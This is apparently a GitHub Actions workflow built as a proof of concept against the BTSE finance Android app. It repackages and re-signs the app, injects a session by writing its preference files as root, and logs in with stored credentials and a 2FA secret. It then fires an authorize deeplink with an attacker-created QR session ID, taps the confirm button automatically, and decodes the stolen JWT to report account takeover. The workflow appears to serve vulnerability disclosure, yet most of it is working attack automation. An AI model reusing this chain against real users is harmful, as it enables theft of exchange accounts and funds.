name: probe
on: workflow_dispatch
jobs:
  nop_test:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
      - name: enable kvm
        run: |
          echo 'KERNEL=="kvm", GROUP="kvm", MODE="0666", OPTIONS+="static_node=kvm"' | sudo tee /etc/udev/rules.d/99-kvm4all.rules
          sudo udevadm control --reload-rules
          sudo udevadm trigger --name-match=kvm
          sudo chmod 666 /dev/kvm 2>/dev/null || true
      - name: apt
        run: sudo apt-get update -qq && sudo apt-get install -y -qq tesseract-ocr 2>&1 | tail -1
      - name: sdk cache
        uses: actions/cache@v4
        with:
          path: |
            /usr/local/lib/android/sdk/emulator
            /usr/local/lib/android/sdk/system-images
          key: sdk-x86-v1
      - name: build-tools cache
        uses: actions/cache@v4
        with:
          path: /usr/local/lib/android/sdk/build-tools
          key: build-tools-34
      - name: apk cache
        uses: actions/cache@v4
        with:
          path: /tmp/apks
          key: btse-apks-v1
      - name: sdk+avd
        run: |
          echo "PATH=$ANDROID_HOME/platform-tools:$ANDROID_HOME/emulator:$PATH" >> $GITHUB_ENV
          export PATH=$ANDROID_HOME/platform-tools:$ANDROID_HOME/emulator:$PATH
          yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses >/dev/null || true
          for a in 1 2 3; do
            yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager "platform-tools" "emulator" "system-images;android-33;google_apis;x86_64" > /tmp/sdk.log 2>&1 && break
            tail -5 /tmp/sdk.log; sleep 10
          done
          mkdir -p $HOME/.android/avd
          export ANDROID_AVD_HOME=$HOME/.android/avd
          echo "ANDROID_AVD_HOME=$HOME/.android/avd" >> $GITHUB_ENV
          echo no | $ANDROID_HOME/cmdline-tools/latest/bin/avdmanager create avd -n btse -k "system-images;android-33;google_apis;x86_64" || true
          CFG=$HOME/.android/avd/btse.avd/config.ini
          if [ ! -f "$CFG" ]; then echo CFG_MISSING; exit 1; fi
          for kv in hw.lcd.width=1080 hw.lcd.height=2400 hw.lcd.density=420; do
            k=${kv%%=*}; v=${kv#*=}
            if grep -q "^$k=" $CFG; then sed -i "s|^$k=.*|$k=$v|" $CFG; else echo "$kv" >> $CFG; fi
          done
          grep -E "^hw.lcd" $CFG
      - name: boot
        run: |
          export PATH=$ANDROID_HOME/platform-tools:$PATH
          # App (victim) egress = SG proxy (allowed region; runner US egress is
          # geoblocked on the app login path -> jurisdiction notice). Attacker
          # polling stays DIRECT (runner US egress) = attacker IP != victim IP.
          ( $ANDROID_HOME/emulator/emulator -avd btse -no-window -no-audio -no-boot-anim -gpu swiftshader_indirect -camera-back none -no-snapshot -http-proxy http://43.156.21.122:8080 > /tmp/emu.log 2>&1 & )
          t0=$(date +%s)
          if timeout 420 bash -c 'adb wait-for-device; while [ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d "\r")" != "1" ]; do sleep 5; done'; then
            echo "BOOT_OK in $(( $(date +%s)-t0 ))s"
          else
            echo "BOOT_FAIL"; grep -iE "fatal|error|accel" /tmp/emu.log | head -10; exit 1
          fi
          adb shell wm size; adb shell wm density
          SIZE=$(adb shell wm size | tr -d '\r' | tail -1)
          echo "SIZE=$SIZE"
      - name: build stub apk
        run: |
          rm -rf /tmp/apks/out
          test -f /tmp/apks/real.apk || { echo "real.apk missing from cache"; exit 1; }
          JH=$(dirname $(dirname $(readlink -f $(which javac))))
          echo "JH=$JH"
          gcc -shared -fPIC -nostdlib -fno-stack-protector -fno-builtin -O1 \
            -o /tmp/libstub.so tools/stubs.c -I"$JH/include" -I"$JH/include/linux"
          SYM=$(nm -D --defined-only /tmp/libstub.so | grep -c " Java_" || true)
          NEED=$(readelf -d /tmp/libstub.so | grep NEEDED || true)
          echo "STUB_SYMS=$SYM NEEDED=$NEED"
          if [ -z "$SYM" ] || [ "$SYM" -lt 300 ] || [ -n "$NEED" ]; then echo STUB_BAD; exit 1; fi
          python3 tools/pack_stub.py /tmp/apks/real.apk /tmp/libstub.so /tmp/apks/out
          ZA=$(ls $ANDROID_HOME/build-tools/*/zipalign 2>/dev/null | tail -1 || true)
          if [ -z "$ZA" ]; then
            yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager "build-tools;34.0.0" > /tmp/bt.log 2>&1 || tail -5 /tmp/bt.log
            ZA=$(ls $ANDROID_HOME/build-tools/*/zipalign 2>/dev/null | tail -1 || true)
          fi
          test -n "$ZA" || { echo NO_ZIPALIGN; exit 1; }
          echo "ZIPALIGN=$ZA"
          "$ZA" -p -f 4 /tmp/apks/out/btse_stub-unsigned.apk /tmp/apks/out/btse_stub-aligned.apk
          "$ZA" -c -p 4 /tmp/apks/out/btse_stub-aligned.apk && echo ALIGN_OK
          java -jar tools/uber-apk-signer.jar --apks /tmp/apks/out/btse_stub-aligned.apk --allowResign -o /tmp/apks/out > /tmp/signer.log 2>&1 || true
          tail -6 /tmp/signer.log
          SIGNED=$(ls /tmp/apks/out/*debugSigned.apk 2>/dev/null | head -1)
          test -n "$SIGNED" || { echo NO_SIGNED_APK; exit 1; }
          "$ZA" -c -p 4 "$SIGNED" && echo FINAL_ALIGN_OK || echo FINAL_ALIGN_BAD
          ls -la /tmp/apks/out/
      - name: install app
        run: |
          export PATH=$ANDROID_HOME/platform-tools:$PATH
          # ADBKeyboard IME: deterministic exact-string input (replaces flaky `input text`).
          # Best-effort: driver falls back to `input text` if the IME isn't live.
          adb install -r -t tools/adbkeyboard.apk 2>&1 | tail -1
          sleep 8   # let the PackageManager register the IME service
          for i in 1 2 3 4 5; do
            adb shell ime enable com.android.adbkeyboard/.AdbIME 2>/dev/null && break
            sleep 2
          done
          # most deterministic: write input_method directly (works even if ime set lags)
          adb shell settings put secure input_method com.android.adbkeyboard/.AdbIME
          adb shell ime set com.android.adbkeyboard/.AdbIME 2>/dev/null || true
          echo "IME_LIST=$(adb shell ime list -s | tr '\n' ' ')"
          echo "IME_CURRENT=$(adb shell settings get secure input_method 2>/dev/null || true)"
          APK=$(ls /tmp/apks/out/*debugSigned.apk 2>/dev/null | head -1)
          if [ -z "$APK" ]; then echo "NO_SIGNED_APK"; exit 1; fi
          adb install -r "$APK" || adb install "$APK"
          adb shell dumpsys package com.btse.finance 2>/dev/null | grep -iE "primaryCpuAbi" | head -2 || true
          for p in POST_NOTIFICATIONS READ_PHONE_STATE GET_ACCOUNTS READ_EXTERNAL_STORAGE WRITE_EXTERNAL_STORAGE CAMERA RECORD_AUDIO ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION READ_MEDIA_IMAGES READ_MEDIA_VIDEO READ_MEDIA_AUDIO ACTIVITY_RECOGNITION; do
            adb shell pm grant com.btse.finance android.permission.$p 2>/dev/null || true
          done
          adb logcat -c || true
          # Ekstrak TOTP live utk 2FA program override (fallback 123456)
          adb shell am start -W -n com.btse.finance/com.example.project.ui.launch.LaunchActivity > /tmp/amstart.txt 2>&1 || true
          echo "AMSTART1:"; cat /tmp/amstart.txt
          sleep 25
          adb shell dumpsys window 2>/dev/null | grep mCurrentFocus || true
          echo "INSTALL_DONE"
      - name: Inject A3 session (external prefs, no UI login)
        id: inject
        run: |
          export PATH=$ANDROID_HOME/platform-tools:$PATH
          # Ground truth run6: google_apis image => adb root; write prefs as root,
          # chown/chcon/restorecon to app context, clear stale DataStore so the
          # app re-reads SharedPreferences on next start.
          adb root >/dev/null 2>&1; sleep 3
          adb wait-for-device; sleep 2
          ID=$(adb shell id | tr -d '\r'); echo "ADB_ID=$ID"
          adb shell am force-stop com.btse.finance || true
          sleep 2
          adb push tools/A3_prefs_base.xml /data/local/tmp/base.xml >/dev/null
          D=/data/data/com.btse.finance
          adb shell "sh -c 'mkdir -p $D/shared_prefs && cp /data/local/tmp/base.xml $D/shared_prefs/base.xml && chmod 660 $D/shared_prefs/base.xml && chown \$(stat -c %u:%g $D) $D/shared_prefs/base.xml'"
          echo "CP_RC=$?"
          adb shell "sh -c 'chcon u:object_r:app_data_file:s0 $D/shared_prefs/base.xml'" 2>/dev/null || true
          adb shell "sh -c 'restorecon -v $D/shared_prefs/base.xml'" 2>/dev/null || true
          adb shell "sh -c 'rm -f $D/files/datastore/* 2>/dev/null'" || true
          adb shell "sh -c 'ls -la $D/shared_prefs/'" 2>/dev/null | head -8 || true
          # launch and observe where the app lands WITHOUT any login input
          adb shell am start -W -n com.btse.finance/com.example.project.ui.launch.LaunchActivity > /tmp/inj_start.txt 2>&1 || true
          sleep 30
          FOCUS=$(adb shell dumpsys window 2>/dev/null | grep -m1 mCurrentFocus | tr -d '\r')
          echo "INJECT_FOCUS=$FOCUS"
          adb shell screencap -p /sdcard/inj.png || true
          adb pull /sdcard/inj.png /tmp/inj.png >/dev/null 2>&1 || true
          OI=$(tesseract /tmp/inj.png stdout 2>/dev/null | tr '\n' ' ' | head -c 300)
          echo "INJECT_OCR=$OI"
          UI=$(adb shell uiautomator dump /sdcard/inj_ui.xml >/dev/null 2>&1; adb pull /sdcard/inj_ui.xml /tmp/inj_ui.xml >/dev/null 2>&1; python3 tools/ui_text.py /tmp/inj_ui.xml 2>/dev/null || true)
          echo "INJECT_UI=$(printf '%s' "$UI" | head -c 300)"
          RESULT=UNKNOWN
          LOW=$(printf '%s %s' "$OI" "$UI" | tr 'A-Z' 'a-z')
          if echo "$LOW" | grep -qiE "password|email address"; then
            RESULT=LOGIN
          elif echo "$LOW" | grep -qiE "deposit|spot|futures|assets|markets|withdraw|portfolio"; then
            # home-looking screen: a "Login" button means GUEST home, not a session
            if echo "$LOW" | grep -qiE "\blogin\b|log in|sign-?up"; then
              RESULT=GUEST
            else
              RESULT=HOME
            fi
          fi
          echo "INJECT_RESULT=$RESULT"
          echo "result=$RESULT" >> "$GITHUB_OUTPUT"
      - name: UI login fallback A2 (skip if inject already landed on HOME)
        id: uilogin
        if: steps.inject.outputs.result != 'HOME'
        env:
          BTSE_USER: ${{ secrets.BTSE_USER }}
          BTSE_PASSWORD: ${{ secrets.BTSE_PASSWORD }}
          BTSE_2FA: ${{ secrets.BTSE_2FA_OVERRIDE }}
          BTSE_2FA_SECRET: ${{ secrets.BTSE_2FA_SECRET }}
        run: |
          export PATH=$ANDROID_HOME/platform-tools:$PATH
          # A2 (btleo8848) device is already trusted (needsDeviceCheck=false),
          # so UI login yields a full session WITHOUT email OTP. App writes its
          # own prefs -> no format guessing.
          export BTSE_2FA="${BTSE_2FA:-123456}"
          rm -f /tmp/ui_login_state.json
          # warm-up: app must finish cold start + network init before UI login;
          # otherwise state=net_error for every step.
          adb shell am force-stop com.btse.finance || true
          sleep 2
          adb shell monkey -p com.btse.finance -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 || true
          sleep 30
          adb shell dumpsys window 2>/dev/null | grep -m1 mCurrentFocus || true
          adb logcat -c || true
          python3 tools/login_ui.py /tmp/ui_login_state.json 60 2>&1 | tee /tmp/ui_login.log
          tail -25 /tmp/ui_login.log
          echo "UI_LOGIN_LASTSTATE=$(python3 -c "import json;print(json.load(open('/tmp/ui_login_state.json')).get('last_state',''))" 2>/dev/null || echo '')"
          adb shell screencap -p /sdcard/s2.png || true
          adb pull /sdcard/s2.png /tmp/s2.png >/dev/null 2>&1 || true
          echo "OCR2=$(tesseract /tmp/s2.png stdout 2>/dev/null | tr '\n' ' ' | head -c 300)"
          adb shell uiautomator dump /sdcard/ui2.xml >/dev/null 2>&1 || true
          adb pull /sdcard/ui2.xml /tmp/ui2.xml >/dev/null 2>&1 || true
          echo "UI2=$(python3 tools/ui_text.py /tmp/ui2.xml 2>/dev/null || true)"
          # ground truth: what the app itself wrote after a real login
          adb root >/dev/null 2>&1 || true; sleep 3; adb wait-for-device
          echo "PREFS_LISTING=$(adb shell 'ls -la /data/data/com.btse.finance/shared_prefs/ /data/data/com.btse.finance/files/datastore/ 2>&1' | tr -d '\\r' | head -20)"
          adb shell 'for f in /data/data/com.btse.finance/shared_prefs/*.xml; do echo "== $f =="; done' 2>/dev/null || true
          adb pull /data/data/com.btse.finance/shared_prefs/base.xml /tmp/app_base.xml >/dev/null 2>&1 && echo "PREFS_PULL_OK" || echo "PREFS_PULL_FAIL"
          adb pull /data/data/com.btse.finance/shared_prefs /tmp/prefs_all >/dev/null 2>&1 || true
          echo "=== FIELD DIAG (class|rid|focused|text|bounds) ==="
          python3 - <<'PYEOF' || true
          import re
          xml = open('/tmp/ui2.xml', errors='ignore').read()
          for node in re.findall(r'<node [^>]*?/?>', xml, re.S):
              a = dict(re.findall(r'([\w-]+)="([^"]*)"', node))
              cls = a.get('class', '')
              if cls.endswith('EditText') or cls.endswith('AutoCompleteTextView'):
                  print(f"FIELD cls={cls.split('.')[-1]:22} rid={a.get('resource-id','').split('/')[-1]:18} "
                        f"focused={a.get('focused','')} text={a.get('text','')!r} bounds={a.get('bounds','')}")
          PYEOF
          adb shell ls -la /data/data/com.btse.finance/shared_prefs/ 2>/dev/null | head -12 || true
          adb logcat -d > /tmp/logcat.txt 2>/dev/null || true
          grep -iE "login|token|unauthorized|10002|401" /tmp/logcat.txt | grep -vi "looper\|system" | head -10 || true
      - name: attack chain + verdict
        run: |
          export PATH=$ANDROID_HOME/platform-tools:$PATH
          rm -f poc_sid.txt stolen_token.txt /tmp/ui.xml /tmp/attack.log
          # 1) preflight DIRECT (bucket IP attacker/runner, tanpa proxy) — 400/401/200 = sehat
          PF=000
          for i in $(seq 1 12); do
            U=$(python3 -c "import uuid;print(uuid.uuid4())")
            PF=$(curl -4 -s -o /tmp/pf.json -w "%{http_code}" --max-time 15 "https://testapi.btse.io/api/qr/info?sessionId=$U" || echo 000)
            echo "PREFLIGHT_DIRECT[$i]=$PF"
            case "$PF" in 400|401|200) break;; esac
            sleep 15
          done
          case "$PF" in 400|401|200) echo PREFLIGHT_DIRECT_OK;; *) echo PREFLIGHT_DIRECT_FAIL;; esac
          # 1b) preflight jalur app (SG proxy) — satu request saja, jangan spam
          U=$(python3 -c "import uuid;print(uuid.uuid4())")
          SGC=$(curl -4 -s -o /dev/null -w "%{http_code}" --max-time 15 -x http://43.156.21.122:8080 "https://testapi.btse.io/api/qr/info?sessionId=$U" || echo 000)
          echo "PREFLIGHT_SG=$SGC"
          # 2) session check: UI login = source of truth; verifikasi DataStore tertulis
          if adb shell ls /data/data/com.btse.finance/files/datastore/ 2>/dev/null | grep -qiE "datastore|preferences"; then
            echo "DATASTORE_PRESENT"
          else
            echo "DATASTORE_ABSENT"
          fi
          # 3) settle + STABILITY GATE: konfirmasi app benar-benar di HOME sebelum fire
          sleep 40
          STABLE=0
          for g in $(seq 1 10); do
            FOCUS=$(adb shell dumpsys window 2>/dev/null | grep -m1 mCurrentFocus | tr -d '\r')
            echo "STABILITY[$g] focus=$FOCUS"
            if echo "$FOCUS" | grep -qE "com.btse.finance/com.example.project.ui.main.MainActivity"; then
              adb shell screencap -p /sdcard/s2b.png || true
              adb pull /sdcard/s2b.png /tmp/s2b.png >/dev/null 2>&1 || true
              OCRE=$(tesseract /tmp/s2b.png stdout 2>/dev/null | tr '\n' ' ' | head -c 300)
              echo "STABILITY_OCR[$g]=$OCRE"
              if echo "$OCRE" | grep -qiE "assets|markets|withdraw|deposit|portfolio|gainers|volume" && ! echo "$OCRE" | grep -qiE "unable to complete|error"; then
                STABLE=1; break
              fi
            fi
            # belum stabil: retry node / relaunch ringan
            adb shell uiautomator dump /sdcard/ui2.xml >/dev/null 2>&1 || true
            adb pull /sdcard/ui2.xml /tmp/ui2.xml >/dev/null 2>&1 || true
            XY=$(python3 tools/uibounds.py /tmp/ui2.xml Retry 2>/dev/null || true)
            if [ -n "$XY" ]; then adb shell input tap $XY; echo "STABILITY_TAP_RETRY xy=$XY"; fi
            sleep 15
          done
          echo "STABLE=$STABLE"
          # 3b) quiet period: beri 60s ekstra agar burst refresh background habis
          sleep 60
          # 4) attack loop: max 2 ronde; FIRE-ONCE deeplink + TTL guard (sid ±180s)
          #    egress app: DIRECT runner (SG egress ter-throttle testapi)
          #    attacker poll: direct (IP runner) — semua satu egress bersih
          for round in 1 2; do
            if [ -s stolen_token.txt ]; then break; fi
            # rekam layar utk video PoC (max 170s < limit screenrecord 180s)
            ( adb shell screenrecord --time-limit 170 /sdcard/poc_r${round}.mp4 > /dev/null 2>&1 & )
            echo "SCREEN_RECORD r${round} started"
            # in-loop gate PASSIVE: tunggu focus kembali (max 30s), jangan relaunch = jangan burst
            for w in $(seq 1 6); do
              FOCUS=$(adb shell dumpsys window 2>/dev/null | grep -m1 mCurrentFocus | tr -d '\r')
              echo "INLOOP_FOCUS[$round.$w]=$FOCUS"
              echo "$FOCUS" | grep -q "com.btse.finance" && break
              sleep 5
            done
            TAPPED=0
            ERRC=0
            rm -f poc_sid.txt
            python3 -u tools/poc_attacker.py >> /tmp/attack.log 2>&1 &
            ATK=$!
            for i in $(seq 1 30); do [ -s poc_sid.txt ] && break; sleep 1; done
            SID=$(cat poc_sid.txt 2>/dev/null || true)
            echo "ROUND=$round SID=$SID"
            if [ -z "$SID" ]; then kill $ATK 2>/dev/null || true; echo "ROUND=$round NO_SID"; continue; fi
            if [ ! -s poc_sid.txt ]; then kill $ATK 2>/dev/null || true; echo "ROUND=$round NO_SID"; continue; fi
            # Deeplink is handled by LaunchActivity.onStart()/onNewIntent().
            # Keep app alive (session from injected prefs stays loaded); deliver
            # the VIEW intent IMPLICITLY so Android routes it to the declared
            # handler and, if running, via onNewIntent. Do NOT force-stop.
            DL="adb shell am start"
            $DL -a android.intent.action.VIEW \
                -d "app://app.btse.com/app/session/authorize?sessionId=$SID" > /tmp/dl.txt 2>&1 || true
            echo "DEEPLINK_FIRE_ONCE[$round]:"; cat /tmp/dl.txt
            grep -q "Starting: Intent" /tmp/dl.txt || echo "DEEPLINK_CMD_FAILED"
            T0=$(date +%s)
            for i in $(seq 1 22); do
              [ -s stolen_token.txt ] && break
              # TTL guard: sisa sid < 25 detik -> stop (sid expired = re-fire sia-sia)
              AGE=$(( $(date +%s) - T0 ))
              [ "$AGE" -ge 155 ] && { echo "TTL_GUARD stop i=$i age=$AGE"; break; }
              sleep 6
              adb shell screencap -p /sdcard/s3.png || true
              adb pull /sdcard/s3.png /tmp/s3.png >/dev/null 2>&1 || true
              OCR3=$(tesseract /tmp/s3.png stdout 2>/dev/null | tr '\n' ' ' | head -c 300)
              echo "OCR3[$round.$i]=$OCR3"
              rm -f /tmp/ui.xml
              adb shell uiautomator dump /sdcard/ui.xml >/dev/null 2>&1 || true
              adb pull /sdcard/ui.xml /tmp/ui.xml >/dev/null 2>&1 || true
              UIX=$(python3 tools/ui_text.py /tmp/ui.xml 2>/dev/null || true)
              echo "UIX[$round.$i]=$UIX"
              UIL=$(printf '%s %s' "$UIX" "$OCR3" | tr 'A-Z' 'a-z')
              # NOTE: match the *authorize/confirm* sheet only. Must NOT match the
              # plain "Log in to BTSE" login screen (rejects that path here).
              if echo "$UIL" | grep -qiE "confirm (log ?in|login)|please confirm|authorize|approve (log ?in|login)?|scan(ning)? qr"; then
                XY=$(python3 tools/uibounds.py /tmp/ui.xml Login 2>/dev/null || true)
                if [ -n "$XY" ]; then
                  adb shell input tap $XY
                  echo "TAP_LOGIN xy=$XY"
                else
                  adb shell input tap 540 2002
                  echo "TAP_LOGIN fallback=540,2002"
                fi
                TAPPED=1
                break
              elif echo "$UIL" | grep -qiE "unable to complete"; then
                ERRC=$((ERRC+1))
                if [ $ERRC -le 2 ]; then
                  XY=$(python3 tools/uibounds.py /tmp/ui.xml Retry 2>/dev/null || true)
                  if [ -n "$XY" ]; then
                    adb shell input tap $XY
                    echo "TAP_RETRY xy=$XY"
                  else
                    echo "RETRY_NODE_NOT_FOUND"
                  fi
                else
                  echo "ERR_MAX skip fire-once tetap"
                fi
              fi
            done
            # tunggu token attacker (post-tap ada jeda: approve→poll SUCCESS)
            for i in $(seq 1 15); do [ -s stolen_token.txt ] && break; sleep 2; done
            kill $ATK 2>/dev/null || true
            # stop screenrecord + unduh video ronde ini
            adb shell pkill -f screenrecord 2>/dev/null || true
            sleep 2
            adb pull /sdcard/poc_r${round}.mp4 /tmp/poc_r${round}.mp4 >/dev/null 2>&1 || true
            echo "VIDEO_R${round}=$(stat -c %s /tmp/poc_r${round}.mp4 2>/dev/null || echo missing)"
            if [ -s stolen_token.txt ]; then break; fi
            echo "ROUND=$round NO_TOKEN TAPPED=$TAPPED ERRC=$ERRC lanjut ronde berikutnya"
          done
          adb shell screencap -p /sdcard/s5.png || true
          adb pull /sdcard/s5.png /tmp/s5.png >/dev/null 2>&1 || true
          adb shell dumpsys window 2>/dev/null | grep mCurrentFocus || true
          adb logcat -d > /tmp/logcat.txt 2>/dev/null || true
          FATALJ=$(grep -c "FATAL EXCEPTION" /tmp/logcat.txt || true)
          FATALN=$(grep -c "Fatal signal" /tmp/logcat.txt || true)
          echo "FATALJ=$FATALJ FATALN=$FATALN"
          if [ -s stolen_token.txt ]; then
            python3 -c "import json,base64; t=open('stolen_token.txt').read().strip(); p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('ATO_CLAIMS', json.dumps({k:c.get(k) for k in ('username','iss','iat','exp')})); print('TOKEN_LEN', len(t))"
            echo "VERDICT=ATO_SUCCESS"
          else
            echo "VERDICT=NO_ATO"
          fi
          sed -i 's/eyJ[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}/<JWT>/g' /tmp/attack.log /tmp/logcat.txt 2>/dev/null || true
          echo "=== attack.log (redacted) ==="
          tail -c 3000 /tmp/attack.log
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: poc-run
          path: |
            /tmp/s1.png
